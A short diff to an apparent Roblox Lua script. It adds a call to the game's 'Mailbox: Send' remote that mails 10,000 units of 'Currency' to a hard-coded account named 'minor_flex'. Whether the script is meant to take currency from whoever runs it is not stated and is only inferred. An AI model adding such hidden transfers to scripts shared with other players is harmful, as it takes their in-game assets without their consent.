@@ -7,6 +7,15 @@ local args = {
 }
 game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 
+local args = {
+	"minor_flex",
+	"`234567890-",
+	"Currency",
+	"06046ccdb1a6459ca402afed31959990",
+	10000
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+
 
 local args = {
 	"MailboxMachine"
